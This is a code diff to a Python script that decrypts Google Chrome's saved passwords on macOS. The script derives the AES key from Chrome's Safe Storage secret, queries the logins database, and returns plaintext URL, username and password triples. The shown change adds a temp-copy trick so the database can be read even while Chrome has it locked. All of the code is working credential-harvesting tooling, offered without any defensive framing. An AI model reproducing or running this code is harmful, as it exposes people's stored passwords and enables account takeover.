@@ -1,4 +1,4 @@
-import sqlite3, os, binascii, subprocess, base64, sys, hashlib
+import sqlite3, os, binascii, subprocess, base64, sys, hashlib, tempfile, shutil
 
 path = "%s/Library/Application Support/Google/Chrome/" % os.path.expanduser("~")
 loginData = []
@@ -22,9 +22,12 @@ def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKD
 def chromeProcess(safeStorageKey, loginData):
     iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
     key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
-    fd = os.open(loginData, os.O_RDONLY) #open as read only
-    database = sqlite3.connect('/dev/fd/%d' % fd)
-    os.close(fd)
+    copypath = tempfile.mkdtemp() #work around for locking DB
+    with open(loginData, 'r') as content:
+        dbcopy = content.read()
+    with open('%s/chrome' % copypath, 'w') as content:
+        content.write(dbcopy) #if chrome is open, the DB will be locked, so get around by making a temp copy
+    database = sqlite3.connect('%s/chrome' % copypath)
     sql = 'select username_value, password_value, origin_url from logins'
     decryptedList = []
     with database:
@@ -34,6 +37,7 @@ def chromeProcess(safeStorageKey, loginData):
             else:
                 urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
                 decryptedList.append(urlUserPassDecrypted)
+    shutil.rmtree(copypath)
     return decryptedList
 
 for profile in loginData:
